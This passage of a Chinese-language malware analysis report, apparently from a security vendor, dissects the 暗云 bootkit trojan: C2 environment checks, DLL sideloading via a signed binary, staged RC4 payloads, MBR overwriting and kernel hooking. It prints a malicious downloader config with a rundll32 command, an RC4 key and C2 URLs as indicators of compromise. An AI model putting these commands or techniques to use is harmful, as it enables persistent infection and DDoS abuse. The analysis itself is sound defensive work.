class="line" data-line="69">这个内存解密出来的样本的功能为：</p>\n<p class="line" data-line="71">检测本机的环境（包括是否安装有360安全软件，是否是网吧环境，是否是虚拟机环境等），将收集到的客户端信息发送到http://c2tongji.b5156.com:89，服务器根据对本机环境做出判断返回不同内容。只有在满足特定环境的情况下，才会返回带有恶意下载链接的配置文件。而在木马的运行环境不符合木马作者的预期时，则不会返回恶意配置文件，以此来逃避安全软件查杀。</p>\n<p class="line" data-line="73">检测虚拟机的代码片段：</p>\n<p class="text-center line" data-line="75"><img src="/uploads/2017/07/25/54973d048e7febe6b07039866cae4eea.png" alt="" width="90%"></p>\n<p class="line" data-line="77">检测360安全软件的代码片段：</p>\n<p class="text-center line" data-line="79"><img src="/uploads/2017/07/25/e291e320f4497ac980561387b51413da.png" alt="" width="90%"></p>\n<p class="line" data-line="81">检测是否是网吧环境的代码片段：</p>\n<p class="text-center line" data-line="83"><img src="/uploads/2017/07/25/2c5253cef83ef09e1bc914411790624b.png" alt="" width="90%"></p>\n<p class="line" data-line="85">搜集用户信息，通过URLDownloadToFile下载配置文件到本地：</p>\n<p class="text-center line" data-line="87"><img src="/uploads/2017/07/25/7187ef685aaa1b25f1cce49994fa6c70.png" alt="" width="90%"></p>\n<p class="line" data-line="89">下载回来的配置文件的格式为：</p>\n<pre class="hljs"><code class="hljs">[Update] \n\nVersion=2 \nUrl=http://update.njmmy.com:8089/config/LDrvSvc.zip \nCmdLine=rundll32.exe LDrvSvc.dll,RundllInstall \nDir=%appdata%\\\\LDrvSvc\n</code></pre>\n<p class="line" data-line="100">随后对下载回来的配置文件进行解析后，使用CreateProcess加载从配置文件中URL字段的内容：</p>\n<p class="text-center line" data-line="102"><img src="/uploads/2017/07/25/3a276293536a6aae76052c69bd5e0009.png" alt="" width="90%"></p>\n<p class="line" data-line="104">此时下载的内容经过解密后在内存中执行，会尝试改写MBR。</p>\n<h4 class="line" data-line="106">MBR的改写</h4>\n<p class="line" data-line="108">此阶段木马的主要功能为：从上面的配置中下载回来的zip包中包含了驱动人生的白样本，木马利用驱动人生的白样本文件会尝试加载名为DtlCrashCatch.dll文件，而此文件是攻击者所提供的恶意代码，这是典型的白加黑绕过杀软的技巧，被国内恶意代码开发者所广泛使用。DtlCrashCatch.dll文件会从http://www.2tf1.com/upcfg.db 得到URL,从那个URL指向位置下载加密过的内容，在本地内存中解密后加载执行尝试修改用户计算机硬盘的MBR。</p>\n<p class="line" data-line="110">被恶意利用的白签名文件：</p>\n<center><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td class="text-right"><strong>Hash</strong></td>\n<td>b3a4d017e51da2a3aef520d4836c6dc6</td>\n</tr>\n<tr>\n<td class="text-right"><strong>签名信息</strong></td>\n<td>Shenzhen DriveTheLife Software Technology Co.Ltd</td>\n</tr>\n</tbody>\n</table>\n</center>\n<p class="text-center line" data-line="119"><img src="/uploads/2017/07/25/1f3867e09ed33b793a5d289b29c97a5b.png" alt=""></p>\n<p class="line" data-line="121">具体的过程为：</p>\n<p class="line" data-line="123">通过调用“rundll32.exe LDrvSvc.dll,RundllInstall Dir=%appdata%\\LDrvSvc”命令，将调用LDrvSvc.dll的RundllInstall函数,在RundllInstall函数中调用了HostInstall函数。</p>\n<p class="text-center line" data-line="125"><img src="/uploads/2017/07/25/85b5ec0409f383567f0b1549b690dacb.png" alt=""></p>\n<p class="line" data-line="127">而HostInstall函数会将在系统中注册LDrvSvc服务。</p>\n<p class="text-center line" data-line="129"><img src="/uploads/2017/07/25/3d6bec505975067b32d8763a840beb0c.png" alt="" width="99%"></p>\n<p class="line" data-line="131">随后以服务方式启动LDrvSvc.dll，这时会进入LDrvSvc.dll的ServiceMain函数。ServiceMain函数会加载DtlCrashCatch.dll文件</p>\n<p class="text-center line" data-line="133"><img src="/uploads/2017/07/25/298ad7bf8935ff4ead3d9db5c196f408.png" alt="" width="90%"></p>\n<p class="line" data-line="135">最终会调用DtlCrashCatch.dll的1001E889代码处：</p>\n<p class="text-center line" data-line="137"><img src="/uploads/2017/07/25/e0518563c8f545b78b5f883786ca2eab.png" alt=""></p>\n<p class="line" data-line="139">上述代码功能为通过CreateFileMapping和MappingViewOfFile解密指定尾部数据到一个共享内存，解密到共享内存中的代码shellcode，功能为调用RtlDecompressBuffer解密出PE并到PE入口点处执行。</p>\n<p class="line" data-line="141">这个PE的功能为从http://www.2tf1.com/upcfg.db下载文件，将文件使用RC4算法解密，并判断下载回来的文件前4个字节是不是0xA5A5A5A5，如果满足条件则从解密后的第4个字节处开始执行。</p>\n<p class="line" data-line="143">此处使用的RC4密钥的十六进制表示为：</p>\n<blockquote>\n<p>F4 70 75 3D 21 B7 D8 95 BE 49 48 C1 56 F6 A9 C1</p>\n</blockquote>\n<p class="line" data-line="147">下载配置文件代码片段：</p>\n<p class="text-center line" data-line="149"><img src="/uploads/2017/07/25/c95671370be5e1961e9eeef2cfbf49cc.png" alt=""></p>\n<p class="line" data-line="151">RC4解密后，比较0xA5A5A5A5代码片段：</p>\n<p class="text-center line" data-line="153"><img src="/uploads/2017/07/25/2c2b82a1842430ea939c019fcae7d322.png" alt=""></p>\n<p class="line" data-line="155">从解密出的代码+4处开始执行后，又会执行与前面类似的解密过程，先通过RtlDecompressBuffer解压缩代码后面部分压缩过的PE文件数据，随后动态加载PE后，到PE入口点执行。</p>\n<p class="line" data-line="157">这时解压缩的代码片段：</p>\n<p class="text-center line" data-line="159"><img src="/uploads/2017/07/25/ff178268784de66dbfc2e790fe8f0aba.png" alt="" width="90%"></p>\n<p class="line" data-line="161">内存加载PE代码片段：</p>\n<p class="text-center line" data-line="163"><img src="/uploads/2017/07/25/89ee096572aa2ca4e893c3ceccdafad7.png" alt="" width="90%"></p>\n<p class="line" data-line="165">内存中加载的这个PE文件才是最终真正的修改MBR的PE。</p>\n<p class="line" data-line="167">加载到内存后，判断ldrvsvc.dll模块的0x156C处是否为“0x8B 0x44 0x24 0x04 0x83 0xE8 0x01”（用来判断是不是已经被patch过），如果判断通过，就将ldrvsvc.dll模块的0x156C patch为”jmp 4C62D”：</p>\n<p class="text-center line" data-line="169"><img src="/uploads/2017/07/25/ffebc399af572d163059cbd8801783cb.png" alt="" width="90%"></p>\n<p class="line" data-line="171">用来对ldrvsvc.dll做patch的代码：</p>\n<p class="text-center line" data-line="173"><img src="/uploads/2017/07/25/eaa5a92ca28ffa2585bb5b50f2cc0cb6.png" alt=""></p>\n<p class="line" data-line="175">被patch后的ldrvsvc.dll，最终会被服务调用，进而执行写入MBR操作。为了防止对MBR的重复写入，木马在写入MBR操作前，会比较MBR是不是特征代码片段：</p>\n<blockquote>\n<p>31 C0 FA 31 DB 8E D3 36 89 26 FE 7B BC FE 7B 1E 66 60 8E DB 3E A1 13 04 24 FC 83 E8 40 3E A3 13</p>\n</blockquote>\n<p class="line" data-line="179">比较MBR是否已经被写入的代码片段：</p>\n<p class="text-center line" data-line="181"><img src="/uploads/2017/07/25/e9919d54440cdbb858292dcc0706ec22.png" alt=""></p>\n<p class="line" data-line="183">木马会把原始的MBR备份到系统第二扇区中，同时在第一扇区中写入恶意代码，在3-63扇区中写入加密过的恶意代码：</p>\n<p class="text-center line" data-line="185"><img src="/uploads/2017/07/25/9303d0fa513bcc7f95d6a2610f3229a9.png" alt="" width="90%"></p>\n<h4 class="line" data-line="187">Bootkit功能分析</h4>\n<p class="line" data-line="189">bootkit功能主要：在内核以TDI 的方式访问网络下载shellcode解密后直接在内核中运行。木马在TDI层用udp连接访问ms.maimai666.com的8064端口获取shellcode。如果失败改用tcp连接ms.maimai666.com的8864获取。得到的内容会在内存中解密，解密后以APC的形式插入到应用层进程中。插入到应用层的代码功能主要为：根据配置文件从 http://www.acsewle.com:8877/ds/cl.db 下载加密后的文件，文件解密后的样本功能在下一小节中分析。</p>\n<p class="line" data-line="191">由上一节对MBR写入过程的调试发现写入MBR后，系统第1个扇区的内容变为下图所示，这是木马的病毒代码：</p>\n<p class="text-center line" data-line="193"><img src="/uploads/2017/07/25/71529405f6d1bac7201e01935973b684.png" alt=""></p>\n<p class="line" data-line="195">系统第1扇区的代码功能为：将磁盘3-63扇区的木马主体加载到内存中解密执行。</p>\n<p class="line" data-line="197">解密部分代码片段：</p>\n<p class="text-center line" data-line="199"><img src="/uploads/2017/07/25/6c3762f4e13d6b9ae103399f3e440642.png" alt=""></p>\n<p class="line" data-line="201">这部分解密代码的功能是：挂钩系统的15号中断，随后读取第二扇区中的备份MBR正常地引导系统启动。</p>\n<p class="line" data-line="203">挂钩系统的15号中断代码片段：</p>\n<p class="text-center line" data-line="205"><img src="/uploads/2017/07/25/3bd39c11abd44bf2895bdd954e50eeeb.png" alt=""></p>\n<p class="line" data-line="207">挂钩成功后，使用第二扇区中备份的系统MBR正常地引导启动：</p>\n<p class="text-center line" data-line="209"><img src="/uploads/2017/07/25/6fe270ce10943e6b8b4716e24f5546dc.png" alt=""></p>\n<p class="line" data-line="211">INT 15中断向量被挂钩前后对比图：</p>\n<p class="text-center line" data-line="213"><img src="/uploads/2017/07/25/7cb1bab3e81c2ef56c7a341beb23469b.png" alt=""></p>\n<p class="line" data-line="215">随后，bootkit会挂钩BILoadImageEx函数、ntoskrnl入口点等。此外，木马还会根据磁盘类型和操作系统替换DriverStartIo、 AtapiHwStartIo、RaUnitStartIo等函数，从而阻止其他程序读取磁盘原始MBR。当检测到读MBR时，返回一个正常的MBR，检测到写MBR时，则直接忽略该操作。这就导致了系统中毒之后，如果木马作者没有打开云控开关的情况会，很难察觉电脑中毒。</p>\n<p class="line" data-line="217">这样，当系统下次启动时，系统引导会通过int 15中断查询内存信息，此时挂钩15号中断的木马便得以第二次获得CPU控制权，获得控制权后木马挂钩BILoadImageEx函数，调用原始15号中断并将控制权交回给系统继续引导。</p>\n<p class="line" data-line="219">当系统引导代码调用BILoadImageEx加载ntoskrnl.exe时，木马便第三次获得控制权，获得控制权后木马再一次执行挂钩操作，此次挂钩的位置是ntoskrnl.exe的入口点，随后将控制权交给系统继续引导。</p>\n<p class="line" data-line="221">当引导完毕进入windows内核时，挂钩ntoskrnl入口点的木马代码第四次获得CPU控制权，此时木马已真正进入windows内核中，获得控制权后，分配一块内存空间，将木马内核的主功能代码拷贝到分配的空间中，并通过创建PsSetCreateThreadNotifyRoutine回调的方式使主功能代码得以执行。至此完成木马由MBR到windows内核的加载过程<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup> <sup class="footnote-ref"><a href="#fn2" id="fnref2">[2]</a></sup> <sup class="footnote-ref"><a href="#fn3" id="fnref3">[3]</a></sup>。</p>\n<h3 class="line" data-line="223">Bootkit所加载木马的分析</h3>\n<p class="line" data-line="225">对bootkit从云端加载的木马进行分析，文件基本信息：</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><strong>Hash</strong></td>\n<td>518f9e5b1fb6397a27a0851930625049</td>\n</tr>\n<tr>\n<td><strong>文件类型</strong></td>\n<td>Win32 EXE</td>\n</tr>\n<tr>\n<td><strong>文件大小</strong></td>\n<td>48462字节</td>\n</tr>\n<tr>\n<td><strong>时间戳</strong></td>\n<td>2016.12.16 19:56:11</td>\n</tr>\n<tr>\n<td><strong>首次上传VirusTotal时间</strong></td>\n<td>2017-05-24 22:33:38 UTC</td>\n</tr>\n</tbody>\n</table>\n<p class="line" data-line="235">样本功能：</p>\n<p class="line" data-line="237">访问http://www.acsewle.com:8877/ds/kn.html下载配置文件，解析配置文件中的appurl字段，下载appurl字段的url，根据配置文件中ispe为1，则通过CreateProcess直接加载执行。如果配置文件中ispe为0，则解析下载回来的非PE文件，RC4解密该非PE文件，得到PE加载代码与PE文件，以傀儡进程方式注入svchost.exe，，最后通过解密出来的PE加密代码加载解密出来的PE文件。</p>\n<p class="line" data-line="239">细节如下：</p>\n<p F020C369-7CD6-41ea-A91F-3C52F1B72D0B="" class="line" data-line="241">通过事件实现单一进程运行的，事件名：</p>\n<p class="text-center line" data-line="243"><img src="/uploads/2017/07/25/ee925085321838256ca7379b7d541a5c.png" alt="" width="90%"></p>\n<p class="line" data-line="245">下载配置文件到临时文件中：</p>\n<p class="text-center line" data-line="247"><img src="/uploads/2017/07/25/ac003626642fae3c6d6fd7333b850b35.png" alt="" width="90%"></p>\n<p class="line" data-line="249">访问http://www.acsewle.com:8877/ds/kn.html</p>\n<p class="text-center line" data-line="251"><img src="/uploads/2017/07/25/1995c6346babc733157075ea21684beb.png" alt="" width="90%"></p>\n<pre class="hljs"><code class="hljs">[Config] \n\nversion = 890 \nisexe = 0 \nappurl = http://www.acsewle.com:8877/ds/lcdn.db\n</code></pre>\n<p class="line" data-line="261">解析CONFIG中的配置项目：</p>\n<p class="text-center line" data-line="263"><img src="/uploads/2017/07/25/7c89e9c3ef5433b36e5e3d3a8b485eb0.png" alt="" width="90%"></p>\n<p class="line" data-line="265">解析出 appurl后，会下载appurl的地址到临时文件。</p>\n<p class="line" data-line="267">下载回来的代码如下：</p>\n<p class="text-center line" data-line="269"><img src="/uploads/2017/07/25/8011249a08c35bcff43e61df03a865c6.png" alt="" width="90%"></p>\n<p class="line" data-line="271">其中的格式为：</p>\n<p class="line" data-line="273">前面8字节为“SLDREXEC”，标识字符，图中黑色框部分。绿色框部分为加密过的shellcode的长度。红色框部分为加密shellcode时使用的RC4密钥。褐色框部分为加密过的shellcode的内容。</p>\n<p class="line" data-line="275">使用RC4算法将上面的褐色框部分解密后的内容分为两部分：</p>\n<p class="line" data-line="277">第一部分为代码片段，用于动态加载PE文件</p>\n<p class="line" data-line="279">第二部分为完整的PE文件，从文件偏移0x328处就是一个完整的PE文件。</p>\n<p class="line" data-line="281">PE文件片段如下：</p>\n<p class="text-center line" data-line="283"><img src="/uploads/2017/07/25/1b869ed9bd514c6c38358ca3f43d7a7a.png" alt=""></p>\n<p class="line" data-line="285">解密出来的注入代码如下：</p>\n<p class="text-center line" data-line="287"><img src="/uploads/2017/07/25/e99266a00fd896a3fa8c4170c2fb1524.png" alt=""></p>\n<p class="line" data-line="289">将上面解密出的内容注入到svchost.exe中执行：</p>\n<p class="text-center line" data-line="291"><img src="/uploads/2017/07/25/b3d8df3c0753fb1471a8d799438fc0fe.png" alt=""></p>\n<p class="line" data-line="293">注入到svhost.exe中的代码包含上面所有的解密内容（包括代码片段与完整的PE文件）。</p>\n<p class="line" data-line="295">代码片段的功能是动态获得函数地址，在内存中加载解密出的PE文件：</p>\n<p class="text-center line" data-line="297"><img src="/uploads/2017/07/25/87dd47533d79cd2cf6f30413e34b0a03.png" alt=""></p>\n<p class="line" data-line="299">内存加载PE并到入口点执行</p>\n<p class="text-center line" data-line="301"><img src="/uploads/2017/07/25/aff38627a0c9b0bc69e7fa6ffafcffe3.png" alt=""></p>\n<p class="line" data-line="303">Payload使用了UPX压缩。Payload的功能为，从网上下载lua脚本保存到临时文件，随后使用PE中内置的lua解析程序运行下载的lua脚本。</p>\n<p class="line" data-line="305">从http://www.acsewle.com:8877/ld/ndn.db下载lua脚本到本地：</p>\n<p class="text-center line" data-line="307"><img src="/uploads/2017/07/25/7c279c462a1596b8df87df2f5e2c222c.png" alt="" width="90%"></p>\n<p class="line" data-line="309">使用PE中内置的lua解析器执行lua脚本：</p>\n<p class="text-center line" data-line="311"><img src="/uploads/2017/07/25/9447657683fe2e8c03b9beb7405af3dc.png" alt="" width="90%"></p>\n<p class="line" data-line="313">木马根据云端配置不同的lua脚本实现不同的功能。主要不同的lua的功能包括：统计受害机器信息功能，发动DDOS攻击功能，发起CC攻击功能等。</p>\n<h2 class="line" data-line="315">解决方案</h2>\n<p class="line" data-line="317">从以上的技术分析可以看到，暗云木马感染了MBR，即使重装系统，MBR里的恶意代码还会联网下载木马病毒执行。目前比较稳妥的解决办法是使用360急救箱的强力模式进行系统扫描，360急救箱强力模式会重启系统先于木马启动，从而彻底清除MBR中恶意代码，恢复系统正常MBR。</p>\n<p class="line" data-line="319">360急救箱下载地址：<a href="http://down.360safe.com/360c0mpkill5.1.64.1183-0605.zip">http://down.360safe.com/360c0mpkill5.1.64.1183-0605.zip</a></p>\n<h2 class="line" data-line="321">IOC</h2>\n<p class="line" data-line="323">由于木马一旦感染会先于操作系统启动，在本地进行检查会变得非常困难，但由于木马有相对固定的网络行为，由于可以在网络出口尝试匹配如下URL及相应域名访问尝试，由可以比较有效低成本的发现中招系统。我们提供如下的URL IOC：</p>\n<p class="line" data-line="325">http://www.acsewle.com:8877/ds/kn.html</p>\n<p class="line" data-line="327">http://ms.maimai666.com</p>\n<p class="line" data-line="329">http://www.acsewle.com:8877/ds/cl.db</p>\n<p class="line" data-line="331">http://www.acsewle.com:8877/ds/lcdn.db</p>\n<p class="line" data-line="333">http://www.acsewle.com:8877/ds/ndn.db</p>\n<p class="line" data-line="335">http://www.2tf1.com/upcfg.db</p>\n<p class="line" data-line="337">http://update.njmmy.com:8089/config/LDrvSvc.zip</p>\n<p class="line" data-line="339">http://www.acsewle.com:8877/um.php</p>\n<h2 class="line" data-line="341">参考信息</h2>\n<hr class="footnotes-sep">\n<section class="footnotes">\n<ol class="footnotes-list">\n<li id="fn1" class="footnote-item"><p><a href="http://bbs.guanjia.qq.com/forum.php?mod=viewthread&amp;tid=5307974">http://bbs.guanjia.qq.com/forum.php?mod=viewthread&amp;tid=5307974</a> <a href="#fnref1" class="footnote-backref">↩︎</a></p>\n</li>\n<li id="fn2" class="footnote-item"><p><a href="https://mp.weixin.qq.com/s/MYbSHWHE4qpa0XJ3N6nAzw">https://mp.weixin.qq.com/s/MYbSHWHE4qpa0XJ3N6nAzw</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p>\n</li>\n<li id="fn3" class="footnote-item"><p><a href="http://www.freebuf.com/articles/system/134017.html">http://www.freebuf.com/articles/system/134017.html</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p>\n</li>\n</ol>\n</section>\n'}},serverRendered:!0}</script><script defer src="/_nuxt/manifest.38f62477280dcc27df9e.js"></script><script defer src="/_nuxt/vendor.bundle.45eca4dc7fa9e1bc4361.js"></script><script defer src="/_nuxt/nuxt.bundle.8e9d53f64bed77ebfe81.js"></script>